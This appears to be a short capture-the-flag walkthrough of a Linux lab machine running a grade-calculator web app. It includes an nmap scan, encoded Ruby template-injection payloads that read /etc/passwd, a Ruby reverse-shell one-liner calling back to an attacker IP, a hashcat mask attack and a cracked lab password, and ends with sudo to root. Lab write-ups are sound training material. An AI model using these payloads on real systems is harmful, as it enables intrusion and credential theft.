#easy #linux #ssti #encoding #hashcat-mask 

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 07:45 CST
Nmap scan report for 10.129.229.121
Host is up (0.0034s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds

```

# /weighted-grade has a calculator functionality that's vulnerable to SSTI 

# Category column accepts alphanumeric input 

# '%=' needs to be encoded to execute arbitrary codes without error %0a is an encoded version of a line feed \n or newline, 

```shell
test%0a<%25%3d+File.open('/etc/passwd').read+%25>
```

# The input needs to have a text to avoid errors, and \n or %0a to render the payload on a newline 

# Reverse shell payload
https://stackoverflow.com/questions/52062703/ruby-one-liner-breakdown

```
test%0a<%25%3d+c=TCPSocket.new('10.10.14.84','4444');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end+%25>

```


# database file found on ../Migrations/pupilpath_credentials.db

# read a mail from /var/mail which mentions that the password of the user uses this format firstname_reverse-fname_random-numbers

# used the -a 3 option in hashcat which is brute force 

```shell
hashcat -m 1400 -a 3 password.txt susan_nasus_?d?d?d?d?d?d?d?d?d
```

susan:susan_nasus_413759210

# susan is a member of sudo group,

```
sudo /bin/bash -p
```